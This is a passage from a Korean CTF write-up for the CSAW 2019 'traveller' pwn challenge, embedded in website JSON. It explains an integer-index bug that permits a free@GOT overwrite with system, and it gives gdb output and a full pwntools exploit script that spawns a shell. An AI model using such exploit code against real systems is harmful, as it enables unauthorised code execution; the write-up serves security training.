class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tssize_t i <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">>=</span> tIndex<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No trip in here. \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\ttrip <span class=\"token operator\">*</span>aTrip <span class=\"token operator\">=</span> trips<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s \\n\"</span><span class=\"token punctuation\">,</span> aTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>trips 구조체의 destination 멤버 를 출력하는 형식이다.</li>\n</ul>\n<h1 id=\"해결-방안\" style=\"position:relative;\"><a href=\"#%ED%95%B4%EA%B2%B0-%EB%B0%A9%EC%95%88\" aria-label=\"해결 방안 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>해결 방안</h1>\n<h2 id=\"exploit-idea\" style=\"position:relative;\"><a href=\"#exploit-idea\" aria-label=\"exploit idea permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit Idea</h2>\n<ul>\n<li>change 함수에서 Integer issue를 바탕으로 어떤 메모리를 덮을 수 있을까? 동적 메모리를 할당하고 해제하는 해당 바이너리에서 free의 got 부분을 조작하여 system@got로 변경할 수있다면 delete 함수를 호출하여 내부적으로 동작하면서 system 함수가 호출되어 쉴을 획득할 수 있을 것이다.</li>\n</ul>\n<h2 id=\"freeplt6\" style=\"position:relative;\"><a href=\"#freeplt6\" aria-label=\"freeplt6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>free@plt+6</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAoElEQVQI1xXCDQ6CIBgAUA9im6h8yJ+iEaApkLjZpmut7n+X1tvLUkh+juaRtvfHhlWOk10iUyavKKqbuiIV0JIIBOxSQoEpAlbgJkf4UkIW9/MetmYxMtibc3DEPnjuDuIOq10C6gazv77pebJ20KMffbJzAK6IUJmmctI2LKsdTN8OUmnWXgnv/oUqCC+AYd4R2ROhaioxlcC7RvbAux/EKCLVptyQVwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/f58f69fc7363dba6e8f2bdd6d9ac8541/37523/0.png\"\n        srcset=\"/static/f58f69fc7363dba6e8f2bdd6d9ac8541/e9ff0/0.png 180w,\n/static/f58f69fc7363dba6e8f2bdd6d9ac8541/f21e7/0.png 360w,\n/static/f58f69fc7363dba6e8f2bdd6d9ac8541/37523/0.png 720w,\n/static/f58f69fc7363dba6e8f2bdd6d9ac8541/715a3/0.png 830w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token number\">0x400c59</span> <span class=\"token operator\">&lt;</span>change<span class=\"token operator\">+</span><span class=\"token number\">99</span><span class=\"token operator\">></span>     mov    rax<span class=\"token punctuation\">,</span> qword ptr <span class=\"token punctuation\">[</span>rbp <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span>\n<span class=\"token number\">0x400c5d</span> <span class=\"token operator\">&lt;</span>change<span class=\"token operator\">+</span><span class=\"token number\">103</span><span class=\"token operator\">></span>    mov    rax<span class=\"token punctuation\">,</span> qword ptr <span class=\"token punctuation\">[</span>rax<span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x6020c0</span><span class=\"token punctuation\">]</span>\n ► <span class=\"token number\">0x400c65</span> <span class=\"token operator\">&lt;</span>change<span class=\"token operator\">+</span><span class=\"token number\">111</span><span class=\"token operator\">></span>    mov    qword ptr <span class=\"token punctuation\">[</span>rbp <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> rax\n\ngdb<span class=\"token operator\">-</span>peda$ p<span class=\"token operator\">/</span><span class=\"token function\">d</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x401f30</span><span class=\"token operator\">-</span><span class=\"token number\">0x6020c0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token number\">8</span>\n$<span class=\"token number\">5</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">262194</span>\ngdb<span class=\"token operator\">-</span>peda$</code></pre></div>\n<ul>\n<li>trips 구조체의 크기만큼 증가하여 주소 번지를 이동하기 때문에 우리는 해당 <code class=\"language-text\">(0x40df30-0x6020c0)/8</code> , -262194 를 choice 변수의 값으로 사용하여 <code class=\"language-text\">0x401f30</code> 주소 로 점프한다.</li>\n<li>그후에 <code class=\"language-text\">free@plt+6</code> 주소에 참조가 가능하여 해당 영역에 우리는 system@plt+6 주소를 덮어써 free@got가 호출될 때 해당 system@plt+6부분이 실행된다.</li>\n</ul>\n<h2 id=\"exploit-code\" style=\"position:relative;\"><a href=\"#exploit-code\" aria-label=\"exploit code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit code</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>        \n    <span class=\"token comment\"># context.log_level = 'debug'</span>\n    <span class=\"token comment\"># context.arch = 'amd64'</span>\n\n    LOCAL <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    DEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n\n    s       <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>       \n    sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n    sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n    sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n    r       <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> num<span class=\"token operator\">=</span><span class=\"token number\">4096</span>           <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\n    rn      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span>  <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span> drop<span class=\"token punctuation\">)</span>\n    irt     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data   <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data   <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    leak    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span> addr <span class=\"token punctuation\">:</span>log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string\">'{} : {:#x}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">if</span> LOCAL<span class=\"token punctuation\">:</span>\n        <span class=\"token comment\">#p = process('./pwn',env={'LD_PRELOAD':'./libc-2.23.so'})</span>\n        p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./traveller'</span><span class=\"token punctuation\">)</span>\n        l <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.23.so'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'_._._._'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8000</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># e = ELF('____')</span>\n        <span class=\"token comment\"># libc = ELF('./libc-2.27.so')</span>\n        <span class=\"token comment\">#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">,</span> des<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span> r<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span> ru<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span> ru<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span> r<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span>des<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">Change</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">,</span> des<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span> r<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span> r<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span>des<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">Delete</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span> r<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">Check</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span> r<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span> r<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\n            \n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello! Welcome to trip management system. \\n\"</span><span class=\"token punctuation\">)</span>\n    argc_stack <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n    leak<span class=\"token punctuation\">(</span><span class=\"token string\">\"argc@stack : \"</span><span class=\"token punctuation\">,</span> argc_stack<span class=\"token punctuation\">)</span>\n    Add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/bin/sh\\x00\"</span><span class=\"token punctuation\">)</span>\n    Change<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">262194</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x400716</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    Delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>      \n    irt<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h2 id=\"get-flag\" style=\"position:relative;\"><a href=\"#get-flag\" aria-label=\"get flag permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>get flag</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 620px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 14.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAeklEQVQI13XLyw6CMBBAUX7E+Ij2QSkzHSYdGooIGI2a8P+fo27cqMld3lOMp7McJ0/RAQMnbrNDdtgAJ5KOU+8pbpVd7813xXRbLvdlvj7afiTpSLLkAWPSFeoqmJqUg83hD07DrB1aH4wP9r1iWTeqhNVOffopX/gJAYQfbX068+cAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/7640167246cbae94ea33c5c614dbd056/2a195/1.png\"\n        srcset=\"/static/7640167246cbae94ea33c5c614dbd056/e9ff0/1.png 180w,\n/static/7640167246cbae94ea33c5c614dbd056/f21e7/1.png 360w,\n/static/7640167246cbae94ea33c5c614dbd056/2a195/1.png 620w\"\n        sizes=\"(max-width: 620px) 100vw, 620px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\">바이너리 개요</a></li>\n<li><a href=\"#%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95\">보호기법</a></li>\n<li><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">main 함수 분석</a></li>\n<li><a href=\"#add-%ED%95%A8%EC%88%98\">add 함수</a></li>\n<li><a href=\"#change-%ED%95%A8%EC%88%98\">change 함수</a></li>\n<li><a href=\"#delete-%ED%95%A8%EC%88%98\">delete 함수</a></li>\n<li><a href=\"#gettrip-%ED%95%A8%EC%88%98\">getTrip 함수</a></li>\n<li><a href=\"#exploit-idea\">Exploit Idea</a></li>\n<li><a href=\"#freeplt6\">free@plt+6</a></li>\n<li><a href=\"#exploit-code\">exploit code</a></li>\n<li><a href=\"#get-flag\">get flag</a></li>\n</ul>\n</div>","frontmatter":{"date":"September 18, 2020","title":"CSAW 2019 traveller 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🍚"},"fields":{"slug":"/csaw2019_travelle_ctf_writeup/"}},"site":{"siteMetadata":{"siteUrl":"https://zer0luck.kr","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/zer0pts_music_ctf_writeup/","nextSlug":"/hitcon2017_sakura_ctf_writeup/2020-08-16-HITCON2017-sakura/","prevSlug":"/csaw2019_travelle_ctf_writeup/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}